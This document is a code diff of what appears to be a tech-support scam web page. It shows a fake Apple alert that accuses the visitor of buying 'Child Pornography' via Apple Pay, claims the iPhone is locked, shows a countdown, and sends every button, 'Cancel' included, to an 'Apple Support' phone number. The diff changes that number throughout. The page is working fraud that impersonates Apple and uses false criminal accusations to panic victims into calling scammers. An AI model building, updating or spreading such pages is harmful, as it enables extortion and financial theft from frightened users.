@@ -51,9 +51,15 @@
     <div class="alert-texts">
         <div class="bgblue"><strong>Transaction of $249.90 via Apple Pay for Child Pornography was found.</strong> <br>For security reasons you are prohibited from using your device.</div>
     <div class="txstm"> <br>
-        Not you? Call <strong>Apple Support: <br><a href="tel:+1-888-824-4789">+1-888-824-4789</a></strong> to unlock your device.
+        Not you? Call <strong>Apple Support: <br><a href="tel:+1-877-374-3816
+
+">+1-877-374-3816
+
+</a></strong> to unlock your device.
      </div>
-    <a href="tel:+1-888-824-4789" class="alert-button">Time left for unlock request: <span id="countdown">10:00</span></a>
+    <a href="tel:+1-877-374-3816
+
+" class="alert-button">Time left for unlock request: <span id="countdown">10:00</span></a>
     
     </div>
 </div>
@@ -72,7 +78,9 @@
   <div class="notification-header">Payment Successful</div>
   <div class="notification-body">
     Sent $249.90 via Apple Pay to Pornhub <br>Premium.
-    Not you? Call +1-888-824-4789
+    Not you? Call +1-877-374-3816
+
+
   </div>
   <img src="images/apple_pay.png" alt="Apple Pay" class="apple-pay">
 </div>
@@ -86,13 +94,23 @@
             <div class="modal-content">
                 <div class="modal-body text-center">
                     <div class="alert-text">
-                        Your Iphone is Temporarily Restricted due to illegal Child Pornography activity. You have purchased a Pornhub subscription of $249.90. The payment was processed from [<span class="user-city" style="font-weight:600;">loading...</span>]. This is an unauthorized transaction. Your account has been locked because of a suspicious payment activity. Verify your account with Apple Support <a href="tel:+1-888-824-4789">+1-888-824-4789</a> to unlock it, otherwise your Iphone will be Permanently Locked.
+                        Your Iphone is Temporarily Restricted due to illegal Child Pornography activity. You have purchased a Pornhub subscription of $249.90. The payment was processed from [<span class="user-city" style="font-weight:600;">loading...</span>]. This is an unauthorized transaction. Your account has been locked because of a suspicious payment activity. Verify your account with Apple Support <a href="tel:+1-877-374-3816
+
+">+1-877-374-3816
+
+</a> to unlock it, otherwise your Iphone will be Permanently Locked.
                     </div>
 
                     
                     <div class="text-end gap-4 mt-3 actionbtn">
-                        <a href="tel:+1-888-824-4789" class="me-2 bg-primary">Call +1-888-824-4789</a>
-                        <a href="tel:+1-888-824-4789" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
+                        <a href="tel:+1-877-374-3816
+
+" class="me-2 bg-primary">Call +1-877-374-3816
+
+</a>
+                        <a href="tel:+1-877-374-3816
+
+" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
                     </div>
                 </div>
             </div>
